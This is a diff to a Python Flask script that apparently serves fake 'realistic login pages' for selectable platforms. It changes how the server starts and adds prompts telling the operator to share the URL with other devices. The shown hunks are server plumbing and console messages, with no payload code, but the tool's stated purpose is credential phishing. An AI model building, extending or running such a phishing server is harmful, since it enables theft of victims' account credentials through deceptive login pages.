@@ -555,13 +555,9 @@ def countdown():
         ip = get_ip()
         print(f"\n{colors.BLUE}Selected: {platform['name']}{colors.END}")
         print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
-        print(f"{colors.GREEN}Open this URL on another device{colors.END}")
-        print(f"{colors.WHITE}Or press Enter to open in browser...{colors.END}")
+        print(f"{colors.GREEN}Open this URL on another device (phone/computer){colors.END}")
+        print(f"{colors.WHITE}Press Enter to continue...{colors.END}")
         input()
-        try:
-            webbrowser.open(f"http://{ip}:5000{platform['path']}")
-        except:
-            print(f"{colors.YELLOW}Please manually open: http://{ip}:5000{platform['path']}{colors.END}")
     else:
         print(f"{colors.RED}Invalid option!{colors.END}")
 
@@ -580,6 +576,7 @@ def run_flask():
     ip = get_ip()
     print(f"{colors.BLUE}\nWeb server starting on http://{ip}:5000{colors.END}")
     print(f"{colors.CYAN}Realistic login pages are ready for all platforms{colors.END}")
+    print(f"{colors.GREEN}Share this URL with other devices: http://{ip}:5000{colors.END}")
     
     # Disable Flask development server warning
     import logging
@@ -590,7 +587,20 @@ def run_flask():
     from werkzeug.serving import WSGIRequestHandler
     WSGIRequestHandler.protocol_version = "HTTP/1.1"
     
-    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
+    # Run Flask quietly
+    import warnings
+    warnings.filterwarnings("ignore")
+    
+    # Run the server
+    from werkzeug.serving import make_server
+    server = make_server('0.0.0.0', 5000, app, threaded=True)
+    print(f"{colors.GREEN}Server started successfully!{colors.END}")
+    print(f"{colors.YELLOW}Press Ctrl+C to stop the server{colors.END}")
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(f"\n{colors.RED}Server stopped.{colors.END}")
 
 def main():
     print_banner()
@@ -601,18 +611,8 @@ def main():
     # Start countdown
     countdown()
     
-    # Start Flask app in a separate thread
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
-    
-    # Keep the main thread alive
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print(f"\n{colors.RED}Exiting...{colors.END}")
-        sys.exit(0)
+    # Start Flask app
+    run_flask()
 
 if __name__ == '__main__':
     main()
